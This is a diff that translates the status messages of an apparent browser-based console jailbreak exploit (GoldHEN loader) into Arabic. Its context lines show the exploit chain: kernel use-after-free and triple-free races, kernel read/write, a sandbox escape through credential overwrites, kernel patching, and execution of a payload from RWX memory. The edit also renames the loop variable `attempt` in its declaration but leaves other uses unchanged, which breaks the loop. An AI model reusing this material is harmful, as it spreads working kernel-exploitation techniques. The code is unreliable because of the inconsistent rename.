@@ -41,14 +41,14 @@ const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 function hostOk() {
     var m = document.getElementById("msgs");
     if (m) {
-        m.innerHTML = "GoldHEN Loaded ...";
+        m.innerHTML = "تم تحميل GoldHEN بنجاح";
     }
 }
 
 function hostFail() {
     var m = document.getElementById("msgs");
     if (m) {
-        m.innerHTML = "Failed to Load! Restart Your Console ...";
+        m.innerHTML = "تعذّر التحميل. أعد تشغيل الجهاز ثم حاول مجدداً.";
         m.style.color = "yellow";
     }
 }
@@ -218,7 +218,7 @@ let payloadRunning = false;
               + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
             : "MISSING");
 
-        state("running the primitive...", "warn");
+        state("جارٍ تشغيل مكوّن الاستغلال...", "warn");
         await new Promise(r => setTimeout(r, 0));
 
         const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
@@ -273,7 +273,7 @@ let payloadRunning = false;
         // collection landing here instead of on the race. If every cycle sits
         // at the floor, nothing was swept and this experiment did nothing.
         if (pairStatus.promoted && SWEEP_CYCLES > 0) {
-            state("sweeping...", "warn");
+            state("جارٍ البحث...", "warn");
             const t0 = Date.now();
             let worst = 0;
             for (let i = 0; i < SWEEP_CYCLES; ++i) {
@@ -455,7 +455,7 @@ let payloadRunning = false;
                 mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
                 var m = document.getElementById("msgs");
                 if (m) {
-                    m.innerHTML = "GoldHEN is Already Loaded ...";
+                    m.innerHTML = "GoldHEN يعمل بالفعل";
                 }
                 return;
             }
@@ -550,7 +550,7 @@ let payloadRunning = false;
         put(msgDv, 0x10, iovAddr);
         msgDv.setInt32(0x18, NUM_MSG_IOV, true);
 
-        state("setting up...", "warn");
+        state("جارٍ التجهيز...", "warn");
         if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
             throw new Error("socketpair failed");
         const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
@@ -618,7 +618,7 @@ let payloadRunning = false;
         const NUM_UIO_WORKER = params.has("uio")
             ? parseInt(params.get("uio"), 10) : 4;
         const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
-        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
+        state("جارٍ تشغيل " + TOTAL_WORKERS + " workers...", "warn");
         for (let i = 0; i < TOTAL_WORKERS; ++i) {
             const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
                 + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
@@ -866,7 +866,7 @@ let payloadRunning = false;
             mark("REFUSING-TO-ARM", "reason=not-rebooted-since-last-committed-run");
             check("console-rebooted-since-last-committed", false,
                 "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
-            state("REBOOT FIRST -- this kernel is still poisoned", "bad");
+            state("أعد تشغيل الجهاز أولاً؛ حالة النواة غير مستقرة", "bad");
             hostFail();
             return;
         }
@@ -880,14 +880,14 @@ let payloadRunning = false;
         // whether an alias exists that we could NOT contain. poops.js:4356
         // refuses on that condition, not on "we already fired".
         let uncontained = null;
-        for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
+        for (let المحاولة = 1; المحاولة <= NUM_ATTEMPT && !triplets; ++attempt) {
             if (uncontained) {
                 mark("NO-RETRY-UNCONTAINED", "attempt=" + attempt
                     + " reason=" + uncontained);
                 break;
             }
-            state("attempt " + attempt + "...", "warn");
-            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
+            state("المحاولة " + المحاولة + "...", "warn");
+            mark("ATTEMPT", المحاولة + "/" + NUM_ATTEMPT);
 
             const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
             if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
@@ -937,7 +937,7 @@ let payloadRunning = false;
                 // aliased, so there is nothing to burn. Drop the spent fd, retry.
                 if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                 mark("ATTEMPT-RETRY", "after=no-twins next="
-                    + (attempt + 1) + "/" + NUM_ATTEMPT);
+                    + (المحاولة + 1) + "/" + NUM_ATTEMPT);
                 continue;
             }
             mark("TWINS", "a=" + twins.a + " b=" + twins.b
@@ -996,7 +996,7 @@ let payloadRunning = false;
                 twins = null;
                 if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                 mark("ATTEMPT-RETRY", "after=refcount-drive burned="
-                    + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
+                    + burned.size + " next=" + (المحاولة + 1) + "/" + NUM_ATTEMPT);
                 continue;
             }
 
@@ -1049,7 +1049,7 @@ let payloadRunning = false;
             if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                 mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
             } else {
-                state("leaking a kqueue...", "warn");
+                state("جارٍ قراءة بيانات kqueue...", "warn");
 
                 freeRthdr(triplets[2]);
                 sc(SYS.sched_yield);
@@ -1440,7 +1440,7 @@ let payloadRunning = false;
         // required below, so the gate on it stays.
         const R1_ON = params.get("r1") !== "0";
         if (!R1_ON && kernelBase && triplets) {
-            state("kread_slow...", "warn");
+            state("جارٍ القراءة البطيئة من النواة...", "warn");
             const got = await kreadSlow(kernelBase, 0x20);
             if (got) {
                 const b = [];
@@ -1456,7 +1456,7 @@ let payloadRunning = false;
 
         let kv = null;
         if (kernelBase && triplets && kqFdp) {
-            state("make_karw...", "warn");
+            state("جارٍ تفعيل القراءة والكتابة في النواة...", "warn");
             mark("SHORT-READS", "n=" + shortReads + " gate=" + (R2_ON ? 1 : 0));
 
             const KREAD_TRIES = params.has("kreadtries")
@@ -1749,7 +1749,7 @@ let payloadRunning = false;
                         const CR_NGROUPS = 0x10, CR_RGID = 0x14;
                         const CR_PRISON = 0x30, CR_SCECAPS1 = 0x60, CR_SCECAPS0 = 0x68;
                         const FD_RDIR = 0x10, FD_JDIR = 0x18;
-                        state("sandbox escape...", "warn");
+                        state("جارٍ الخروج من sandbox...", "warn");
                         {
                             if (sc(SYS.pipe, argAddr).i32 !== -1) {
                                 const escPipe = [argDv.getInt32(0, true),
@@ -1868,7 +1868,7 @@ let payloadRunning = false;
                     }
 
                     // ITEM 6(c). The half that makes the retry safe. Every socket
-                    // burned during a failed attempt still has an rthdr pointing
+                    // burned during a failed المحاولة still has an rthdr pointing
                     // at a freed ucred; closing it would free that chunk again.
                     // Now that kernel R/W exists, null the pointer -- verified by
                     // read-back -- and only then let it out of the burn list.
@@ -1888,7 +1888,7 @@ let payloadRunning = false;
                         if (burned.size) rebootRequired = true;
                     }
 
-                    state("remove_uaf_file...", "warn");
+                    state("جارٍ إزالة ملف UAF...", "warn");
                     const uafFp = fget(uafSock);
                     uafFpSaved = uafFp;
                     mark("UAF-FP", "fd=" + uafSock + " fp=" + uafFp);
@@ -2213,7 +2213,7 @@ let payloadRunning = false;
 
                     let kpatched = false;
                     if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
-                        state("kernel patches...", "warn");
+                        state("جارٍ تطبيق تعديلات النواة...", "warn");
                         const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
                         const sysent = kernelBase.add32(off.k_sysent_661);
                         const gadget = kernelBase.add32(off.k_jmp_rsi);
@@ -2326,7 +2326,7 @@ let payloadRunning = false;
                         mark("PAYLOAD-SKIPPED", "cleanup incomplete / zone dirty -- reboot required");
                     } else if (payload && (kpatched || params.get("payload") === "1")
                         && params.get("payload") !== "0") {
-                        state("payload...", "warn");
+                        state("جارٍ تحميل الحمولة...", "warn");
                         const sz = (payload.length + 0x3fff) & ~0x3fff;
                         const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
                         const entry = new int64(m.lo, m.hi);
@@ -2512,7 +2512,7 @@ let payloadRunning = false;
                 + " reached=" + (triplets ? "triplets" : committed ? "commit" : "none"));
         }
 
-        state(allDone ? "ALL DONE"
+        state(allDone ? "اكتملت العملية"
               : kv ? "KERNEL R/W -- REBOOT NEEDED"
               : kernelBase ? "FAILED IN make_karw -- REBOOT"
               : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
@@ -2524,7 +2524,7 @@ let payloadRunning = false;
         }
     } catch (e) {
         mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
-        state("FAILED -- see log", "bad");
+        state("فشلت العملية؛ راجع سجل التفاصيل", "bad");
         hostFail();
     } finally {
 
